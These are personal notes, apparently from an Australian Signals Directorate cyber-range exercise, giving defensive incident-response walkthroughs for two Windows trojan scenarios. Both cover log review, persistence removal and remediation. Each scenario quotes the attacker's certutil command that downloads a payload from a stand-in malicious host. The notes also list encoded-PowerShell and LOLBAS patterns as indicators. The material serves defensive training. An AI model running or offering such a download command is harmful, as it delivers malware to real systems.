<!--
Title: ASD Live Fire Exchange Programme (GitHub Markdown Version)
Author: Simon .I
Version: 2025.03.30
Description: GitHub-compatible Markdown (GHM) version using supported HTML like <details> and <table>.
-->

<!-- ASD Programme Title -->
<h1 align="center"><strong style="font-size: 4.5rem; letter-spacing: 4px; color: navy;">Australian Signals Directorate - Live Fire Exchange Program</strong></h1>

<p><strong>These are my personal notes from the <em>ASD Live Fire Cyberbitrange</em> event. This document is not provided by or affiliated with the <em>Australian Signals Directorate (ASD)</em> or <em>CyberbitRange</em>.</strong></p>

---

<details>

<summary><strong>🌐 LFE 1 Bangalore – Email Dumper</strong></summary>

### 🔎 Scenario: Email Dumper

A security alert from the EDR system has flagged unusual command-line activity on a Windows host belonging to a university staff member. Early indications show the use of native Windows tools to download and run an unknown payload. Your task is to investigate the host, confirm if email data was targeted, and fully remediate the system.

---

### 📊 Key Event IDs

| Event Source | ID   | Description              |
|--------------|------|--------------------------|
| Sysmon       | 1    | Process Creation         |
| Sysmon       | 3    | Network Connection       |
| Sysmon       | 11   | File Created             |
| Security Log | 4688 | Windows Process Creation |

---

### 🧱 Step 1: Initial Process Review

Use Task Manager or PowerShell to check for suspicious processes:

```powershell
taskmgr
tasklist | findstr /i "powershell certutil agent cmd"
```

Terminate suspicious entries:

```powershell
taskkill /F /PID <PID>
```

Use Process Hacker (or similar tool) to verify parent-child chain:

> Look for:
> ```
> winword.exe → powershell.exe → certutil.exe → agent.exe
> ```

---

### 📜 Step 2: Log Review (Event Viewer or Sysmon)

Open Event Viewer:

```powershell
eventvwr
```

Check:

- **Windows Logs > Security > Event ID 4688**
- **Applications and Services Logs > Microsoft > Windows > Sysmon**

Look for:

- `powershell.exe -enc`
- `certutil.exe` with full URL
- file creation of `agent.exe`
- network connections from the agent process

> Bonus: View command line arguments and parent process IDs in event details.

---

### 🧪 Step 3: Certutil Abuse

The attacker used `certutil` to download a payload directly from the command line:

```powershell
certutil -urlcache -split -f http://malicious.site/agent.exe agent.exe
```

Search for the dropped payload:

```powershell
Get-ChildItem -Path "C:\Users\<user>\AppData\Roaming" -Include agent.exe -Recurse
Get-ChildItem -Path "C:\Users\<user>\AppData\Local\Temp" -Include agent.exe -Recurse
Get-ChildItem -Path "C:\Users\<user>\Desktop","Downloads" -Include agent.exe -Recurse
```

Check file metadata and creation time:

```powershell
Get-Item "C:\Users\<user>\AppData\Roaming\agent.exe" | Select-Object Name, CreationTime, LastAccessTime
Get-AuthenticodeSignature "C:\Users\<user>\AppData\Roaming\agent.exe"
```

---

### 🧬 Step 4: Obfuscated PowerShell Decoding

The attacker used a base64-encoded payload:

```powershell
powershell.exe -enc <Base64>
```

Decode and inspect:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64String>"))
```

Look for embedded downloaders or payload launchers (e.g., `iex`, `Start-Process`).

---

### 🗓 Step 5: Check Scheduled Tasks for Persistence

List all scheduled tasks:

```powershell
schtasks /query /fo LIST /v
```

Look for tasks that point to suspicious `.exe`, `.bat`, or PowerShell commands.

Remove confirmed malicious tasks:

```powershell
Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
```

---

### 🧼 Step 6: Check Registry Autoruns

Review autorun keys:

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Remove entries pointing to `agent.exe`:

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
```

---

### 🌐 Step 7: Network Connections

Check for active or historical network sessions:

```powershell
netstat -bano
```

Correlate PID to process:

```powershell
tasklist | findstr <PID>
```

---

### 📂 Step 8: Investigate Email Data Access

The agent is designed to steal Outlook email archives.

Search for `.pst` and `.ost` files:

```powershell
Get-ChildItem -Path "C:\Users" -Include *.pst,*.ost -File -Recurse -ErrorAction SilentlyContinue
```

Check last access time:

```powershell
Get-Item "C:\Users\<user>\AppData\Local\Microsoft\Outlook\*.ost" | Select-Object Name, LastAccessTime
```

---

### ✅ Step 9: Remediation

Terminate running payload:

```powershell
taskkill /F /PID <PID>
```

Delete the malicious executable:

```powershell
Remove-Item -Path "C:\Users\<user>\AppData\Roaming\agent.exe" -Force
```

Remove registry and task persistence:

```powershell
Unregister-ScheduledTask -TaskName "<Name>" -Confirm:$false
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
```

---

### 🧾 Analyst Notes

- Isolate the host from the network to prevent C2 callbacks
- Submit `agent.exe` to a sandbox or malware analysis platform
- Check other endpoints for indicators (e.g., certutil usage or registry persistence)

---

### 🧠 Key Takeaways

- LOLBAS abuse (`certutil`, `powershell -enc`) remains a common tactic for initial payload delivery
- Obfuscated PowerShell is frequently used to evade detection and download malware
- Email data (`.pst`/`.ost`) is highly targeted and should be monitored for access
- Registry and scheduled tasks remain common persistence techniques
- Combining Sysmon and Event Viewer logs paints a full picture of the infection timeline

</details>

---

<details>

<summary><strong>🌋 LFE 2 Jakarta – Killer Trojan</strong></summary>

### 🔎 Scenario: Killer Trojan

An EDR alert has flagged suspicious behaviour on a user workstation. Analysis indicates a Trojan was downloaded and executed using built-in Windows utilities, with attempts to establish persistence and possibly access email data. Your goal is to investigate the host, confirm the infection method, locate the payload, and eradicate all signs of compromise.

---

### 📊 Key Event IDs

| Event Source | ID   | Description              |
|--------------|------|--------------------------|
| Sysmon       | 1    | Process Creation         |
| Sysmon       | 3    | Network Connection       |
| Sysmon       | 11   | File Created             |
| Security Log | 4688 | Windows Process Creation |

---

### 🧱 Step 1: Initial Process Investigation

List active processes using Task Manager or terminal:

```powershell
taskmgr
tasklist | findstr /i "powershell certutil cmd agent rundll32 regsvr32"
```

Terminate suspicious binaries:

```powershell
taskkill /F /PID <PID>
```

Check parent-child process lineage:

> Example chain:
> ```
> explorer.exe → powershell.exe → certutil.exe → agent.exe
> ```

Tools like **Process Hacker** or **Sysmon event ID 1** can help confirm this chain.

---

### 📜 Step 2: Log Review

Open Event Viewer:

```powershell
eventvwr
```

Check the following:

- **Security > Event ID 4688**: Process Creation
- **Sysmon > Event ID 1**: Process Creation  
- **Sysmon > Event ID 11**: File Creation  
- **Sysmon > Event ID 3**: Network Connection

Look for:

- `certutil.exe` downloads
- agent.exe execution
- any outbound connection attempts

---

### 🧪 Step 3: Certutil Payload Download

The attacker downloaded a payload using:

```powershell
certutil -urlcache -split -f http://malicious.site/agent.exe agent.exe
```

Check for known drop paths:

```powershell
Get-ChildItem -Path "C:\Users\<user>\AppData\Roaming" -Include agent.exe -Recurse
Get-ChildItem -Path "C:\Users\<user>\AppData\Local\Temp" -Include agent.exe -Recurse
```

Optional Defender scan:

```powershell
Start-MpScan -ScanType CustomScan -ScanPath "C:\Users\<user>\AppData\Roaming\agent.exe"
```

Inspect file metadata:

```powershell
Get-Item "C:\Users\<user>\AppData\Roaming\agent.exe" | Select-Object Name, CreationTime, LastAccessTime
Get-AuthenticodeSignature "C:\Users\<user>\AppData\Roaming\agent.exe"
```

---

### 🧬 Step 4: Obfuscated PowerShell Execution (if used)

Check for base64-encoded PowerShell commands in logs:

```powershell
powershell.exe -enc <Base64>
```

Decode with:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64String>"))
```

Look for:
- `Start-Process`, `Invoke-WebRequest`
- Calls to run `agent.exe` or add registry tasks

---

### 🗓 Step 5: Scheduled Task Persistence

List scheduled tasks and review commands:

```powershell
schtasks /query /fo LIST /v
```

Look for:
- Custom task names
- Execution of `agent.exe`, `.bat` scripts, or PowerShell

Delete malicious tasks:

```powershell
Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
```

---

### 🧼 Step 6: Registry Autorun Persistence

Query common persistence keys:

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Remove malicious entries:

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
```

---

### 🌐 Step 7: Network Connection Check

List outbound connections:

```powershell
netstat -bano
```

Correlate PIDs to process names:

```powershell
tasklist | findstr <PID>
```

> Note any strange external IPs or repeated attempts to connect to the same destination.

---

### 📁 Step 8: Search for Email Artefacts or Exfil

While no confirmed exfiltration occurred, the Trojan may target email data.

```powershell
Get-ChildItem -Path "C:\Users" -Include *.pst,*.ost -File -Recurse -ErrorAction SilentlyContinue
```

Check access timestamps:

```powershell
Get-Item "C:\Users\<user>\AppData\Local\Microsoft\Outlook\*.ost" | Select-Object Name, LastAccessTime
```

---

### ✅ Step 9: Remediation

Terminate process:

```powershell
taskkill /F /PID <PID>
```

Remove agent binary:

```powershell
Remove-Item -Path "C:\Users\<user>\AppData\Roaming\agent.exe" -Force
```

Clean up persistence:

```powershell
Unregister-ScheduledTask -TaskName "<Name>" -Confirm:$false
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "<BadEntry>" /f
```

---

### 🧾 Analyst Notes

- Isolate the machine from the network
- Submit `agent.exe` to an analysis platform
- Review other hosts for indicators: certutil use, autorun registry entries, matching hashes
- Consider implementing command-line logging or AppLocker

---

### 🧠 Key Takeaways

- LOLBAS techniques like `certutil` are frequently used to bypass security software
- Roaming and Temp folders are often used for staging malware
- Registry Run keys and Scheduled Tasks are standard persistence methods
- Email data remains a high-value target — access logs matter
- Event logs and process lineage tracking (via Sysmon) are critical for full investigation

</details>

---
